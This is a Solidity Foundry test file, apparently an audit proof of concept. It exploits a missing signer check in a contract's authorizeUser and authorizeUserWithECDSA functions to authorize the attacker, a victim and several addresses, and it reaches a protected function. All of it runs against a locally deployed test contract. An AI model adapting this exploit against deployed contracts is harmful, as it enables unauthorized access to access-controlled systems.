// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/SecureSignatureContract.sol";

/**
 * @title SecureSignatureAttack
 * @notice PoC demonstrating the Missing Authorization vulnerability in SecureSignatureContract
 * 
 * VULNERABILITY: The `authorizeUser` function does not verify that the `signer`
 * (recovered via ecrecover) is the `msg.sender` or a trusted authority.
 * 
 * ATTACK: Any user can generate a valid signature using their own private key,
 * call `authorizeUser`, and set ANY address as an authorized user.
 * 
 * IMPACT: Complete bypass of the authorization system. Any address can be
 * authorized without the knowledge or consent of the contract deployer.
 */
contract SecureSignatureAttack is Test {
    SecureSignatureContract public target;
    
    // Attacker's keypair
    uint256 internal attackerPrivateKey = 0xA11CE;
    address internal attackerAddress;
    
    // Victim address (to be unauthorized)
    address internal victim = address(0xBEEF);
    
    // Legitimate authority (deployer)
    address internal authority = address(this);
    
    function setUp() public {
        target = new SecureSignatureContract();
        attackerAddress = vm.addr(attackerPrivateKey);
        
        console.log("=== SecureSignatureContract PoC ===");
        console.log("Target:", address(target));
        console.log("Attacker:", attackerAddress);
        console.log("Victim:", victim);
    }
    
    /**
     * @notice Attack: Attacker signs a hash with their own key and authorizes themselves
     */
    function test_attack_authorize_self() public {
        // Step 1: Attacker creates a hash (they can use ANY hash)
        bytes32 hash = keccak256(abi.encodePacked(attackerAddress, block.timestamp));
        
        // Step 2: Attacker signs the hash with their OWN private key
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(attackerPrivateKey, hash);
        
        // Step 3: Verify the attacker IS the signer
        address recoveredSigner = ecrecover(hash, v, r, s);
        assertEq(recoveredSigner, attackerAddress, "Signer should be attacker");
        
        // Step 4: Attacker calls authorizeUser with their signature
        // BUG: The contract does NOT check that signer == msg.sender
        // The contract does NOT check that signer is a trusted authority
        target.authorizeUser(v, r, s, hash, attackerAddress);
        
        // Step 5: Attacker is now authorized!
        assertTrue(target.isAuthorized(attackerAddress), "Attacker should be authorized");
        
        console.log("✅ ATTACK SUCCESSFUL: Attacker authorized themselves!");
    }
    
    /**
     * @notice Attack: Attacker authorizes a VICTIM address (unauthorized access)
     */
    function test_attack_authorize_victim() public {
        // Step 1: Attacker signs a hash for victim
        bytes32 hash = keccak256(abi.encodePacked(victim, 42));
        
        // Step 2: Attacker signs with their OWN key
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(attackerPrivateKey, hash);
        
        // Step 3: Attacker authorizes the VICTIM address
        // BUG: No check that signer == user or signer == msg.sender
        target.authorizeUser(v, r, s, hash, victim);
        
        // Step 4: Victim is now authorized (without their knowledge!)
        assertTrue(target.isAuthorized(victim), "Victim should be authorized");
        assertFalse(target.isAuthorized(attackerAddress), "Attacker should NOT be authorized");
        
        console.log("✅ ATTACK SUCCESSFUL: Victim authorized without consent!");
    }
    
    /**
     * @notice Attack: Using authorizeUserWithECDSA with malleable signature
     */
    function test_attack_via_ecdsa_function() public {
        bytes32 hash = keccak256(abi.encodePacked(attackerAddress, 123));
        
        // Create signature
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(attackerPrivateKey, hash);
        bytes memory signature = abi.encodePacked(r, s, v);
        
        // Call the "secure" ECDSA version
        target.authorizeUserWithECDSA(signature, hash, attackerAddress);
        
        assertTrue(target.isAuthorized(attackerAddress), "Attacker authorized via ECDSA");
        console.log("✅ ATTACK SUCCESSFUL: ECDSA version also vulnerable!");
    }
    
    /**
     * @notice Demonstrate the FULL IMPACT: attacker gains access to processData()
     */
    function test_attack_gain_access() public {
        // Initially, attacker cannot access processData
        assertFalse(target.isAuthorized(attackerAddress), "Attacker not authorized yet");
        
        // Attacker signs and self-authorizes
        bytes32 hash = keccak256(abi.encodePacked(attackerAddress, 1));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(attackerPrivateKey, hash);
        target.authorizeUser(v, r, s, hash, attackerAddress);
        
        // Now attacker can call processData (which requires authorization)
        assertTrue(target.processData("malicious data"), "Attacker can now call processData");
        console.log("✅ IMPACT: Attacker gained access to protected function!");
    }
    
    /**
     * @notice Demonstrate that the attack works for ANY address (not just attacker)
     */
    function test_attack_mass_authorization() public {
        // Attacker can authorize multiple addresses
        address[] memory targets = new address[](3);
        targets[0] = address(0x1111);
        targets[1] = address(0x2222);
        targets[2] = address(0x3333);
        
        for (uint256 i = 0; i < targets.length; i++) {
            bytes32 hash = keccak256(abi.encodePacked(targets[i], i));
            (uint8 v, bytes32 r, bytes32 s) = vm.sign(attackerPrivateKey, hash);
            target.authorizeUser(v, r, s, hash, targets[i]);
            assertTrue(target.isAuthorized(targets[i]), "Target should be authorized");
        }
        
        console.log("✅ MASS ATTACK: Attacker authorized 3 addresses!");
    }
}
